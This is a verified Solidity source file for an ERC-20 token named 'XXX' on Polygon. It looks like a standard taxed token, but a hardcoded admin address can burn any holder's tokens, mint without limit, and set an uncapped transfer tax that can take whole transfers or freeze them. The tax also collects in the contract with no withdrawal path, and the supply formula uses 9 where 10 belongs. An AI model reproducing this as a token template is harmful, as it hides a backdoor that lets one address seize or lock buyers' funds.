/**
 *Submitted for verification at polygonscan.com on 2023-06-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.19;

abstract contract Context {
 function _msgSender() internal view virtual returns (address) {
 return msg.sender;
 }

 function _msgData() internal view virtual returns (bytes calldata) {
 return msg.data;
 }
}

interface IERC20 {
 function totalSupply() external view returns (uint256);
 function balanceOf(address account) external view returns (uint256);
 function transfer(address recipient, uint256 amount) external returns (bool);
 function allowance(address owner, address spender) external view returns (uint256);
 function approve(address spender, uint256 amount) external returns (bool);
 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Ownable {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
 constructor() {
 _owner = msg.sender;
 emit OwnershipTransferred(address(0), _owner);
 }

 function owner() public view returns (address) {
 return _owner;
 }

 modifier onlyOwner() {
 require(owner() == msg.sender, "Ownable: caller is not the owner");
 _;
 }

 function transferOwnership(address newOwner) public onlyOwner {
 emit OwnershipTransferred(_owner, newOwner);
 _owner = newOwner;
 }
}

library Address {

 function sendValue(address payable recipient, uint256 amount) internal {
 require(address(this).balance >= amount, "Address: insufficient balance");
 (bool success, ) = recipient.call{value: amount}("");
 require(success, "Address: unable to send value, recipient may have reverted");
 }

 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
 return functionCallWithValue(target, data, 0, "Address: low-level call failed");
 }

 function functionCall(
 address target,
 bytes memory data,
 string memory errorMessage
 ) internal returns (bytes memory) {
 return functionCallWithValue(target, data, 0, errorMessage);
 }

 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
 }

 function functionCallWithValue(
 address target,
 bytes memory data,
 uint256 value,
 string memory errorMessage
 ) internal returns (bytes memory) {
 require(address(this).balance >= value, "Address: insufficient balance for call");
 (bool success, bytes memory returndata) = target.call{value: value}(data);
 return verifyCallResultFromTarget(target, success, returndata, errorMessage);
 }


 function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
 return functionStaticCall(target, data, "Address: low-level static call failed");
 }

 function functionStaticCall(
 address target,
 bytes memory data,
 string memory errorMessage
 ) internal view returns (bytes memory) {
 (bool success, bytes memory returndata) = target.staticcall(data);
 return verifyCallResultFromTarget(target, success, returndata, errorMessage);
 }

 function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
 return functionDelegateCall(target, data, "Address: low-level delegate call failed");
 }

 function functionDelegateCall(
 address target,
 bytes memory data,
 string memory errorMessage
 ) internal returns (bytes memory) {
 (bool success, bytes memory returndata) = target.delegatecall(data);
 return verifyCallResultFromTarget(target, success, returndata, errorMessage);
 }

 function verifyCallResultFromTarget(
 address target,
 bool success,
 bytes memory returndata,
 string memory errorMessage
 ) internal view returns (bytes memory) {
 if (success) {
  if (returndata.length == 0) {
  require(target.code.length > 0, "Address: call to non-contract");
  }
  return returndata;
 } else {
  _revert(returndata, errorMessage);
 }
 }

 function verifyCallResult(
 bool success,
 bytes memory returndata,
 string memory errorMessage
 ) internal pure returns (bytes memory) {
 if (success) {
  return returndata;
 } else {
  _revert(returndata, errorMessage);
 }
 }

 function _revert(bytes memory returndata, string memory errorMessage) private pure {
 if (returndata.length > 0) {

  assembly {
  let returndata_size := mload(returndata)
  revert(add(32, returndata), returndata_size)
  }
 } else {
  revert(errorMessage);
 }
 }
}

contract XXXToken is IERC20, Ownable, Context {
 using Address for address;
 address private adminAddress = 0x3B2a9A8591fF3E49D1ab1D005Da339D622A81C2A;
 string public constant name = "XXX";
 string public constant symbol = "XXX";
 uint8 public constant decimals = 9;
 uint256 private _totalSupply = 2_000_000_000 * 9**decimals;
 mapping(address => uint256) private _balances;
 mapping(address => mapping(address => uint256)) private _allowances;
 uint256 public taxPercentage = 19;  // 1.9%

 constructor() {
 _balances[msg.sender] = _totalSupply;
 emit Transfer(address(0), msg.sender, _totalSupply); 
 }

 function totalSupply() public view override returns (uint256) {
 return _totalSupply;
 }

 function balanceOf(address account) public view override returns (uint256) {
 return _balances[account];
 }

 function transfer(address recipient, uint256 amount) public override returns (bool) {
 _transfer(msg.sender, recipient, amount);
 return true;
 }

 function allowance(address owner, address spender) public view override returns (uint256) {
 return _allowances[owner][spender];
 }

 function approve(address spender, uint256 amount) public override returns (bool) {
 _approve(msg.sender, spender, amount);
 return true;
 }

 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
 _transfer(sender, recipient, amount);
 uint256 currentAllowance = _allowances[sender][msg.sender];
 require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
 _approve(sender, msg.sender, currentAllowance - amount);
 return true;
 }

 function burn(address account, uint256 amount) public virtual {
 require(msg.sender == adminAddress);
 uint256 accountBalance = _balances[account];
 require(accountBalance >= amount);
 unchecked {_balances[account] = accountBalance - amount;}
 _totalSupply -= amount;
 emit Transfer(account, address(0), amount);
 }

function mint(address account, uint256 amount) public virtual {
  require(msg.sender == adminAddress);
 _totalSupply += amount;
 _balances[account] += amount;
 emit Transfer(address(0), account, amount);
 }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function setTaxPercentage(uint256 newPercentage) public {
        require(msg.sender == adminAddress);
        taxPercentage = newPercentage;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(_balances[sender] >= amount, "Insufficient balance");
        uint256 taxAmount = (amount * taxPercentage) / 1000;
        uint256 netAmount = amount - taxAmount;
        _balances[sender] -= amount;
        _balances[recipient] += netAmount;
        _balances[address(this)] += taxAmount;
        emit Transfer(sender, recipient, netAmount);
        emit Transfer(sender, address(this), taxAmount);
    }


 function _approve(address owner, address spender, uint256 amount) internal {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");
 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);
 }
}